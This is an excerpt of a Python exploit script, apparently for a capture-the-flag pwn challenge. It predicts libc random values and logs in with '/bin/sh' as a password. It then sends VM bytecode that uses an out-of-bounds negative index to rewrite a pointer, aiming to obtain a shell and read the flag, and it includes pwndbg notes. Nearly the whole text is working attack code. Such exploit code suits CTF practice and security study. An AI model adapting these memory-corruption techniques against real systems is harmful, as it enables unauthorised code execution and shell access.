...
def gen_rands(seed):
    clibc = cdll.LoadLibrary("./libc-2.31.so")
    clibc.srand(seed)
    rands = []
    for i in range(16):
...
def vm(codes):
    p1 = b""
    p1 += pl32(2) + pl32(0) + pl32(len(codes))
    p1 += codes
    send_manage_packet(p1) 
...
debugf(0x0000000000002150, 0x0000000000002732)
...
name = b"a" * 0x8
passwd = b"/bin/sh\n"
length = len(name) + len(passwd) + 1
login(length, name, passwd, b"u" * 8)

offset = 0x18a0 - 0x0000000000001060
offset_d = 0x1128 // 4
codes = """
mov eax, [-{offset_d}]
sub eax, {offset}
mov [-{offset_d}], eax
""".format(offset=offset, offset_d=offset_d)
vm(codes.encode())
"""
test:
0: 0x000055555555c6d0
-1: 0x000055555555c6cc
pwndbg> distance 0x55555555b5a8 0x000055555555c6d0
0x55555555b5a0->0x55555555c6d0 is 0x1128 bytes (0x226 words)
"""
show(b"u" * 8)
# p.interactive()
# p.sendline('cat flag')
...
flag_data = p.recvall(timeout=5).decode(errors='ignore') 
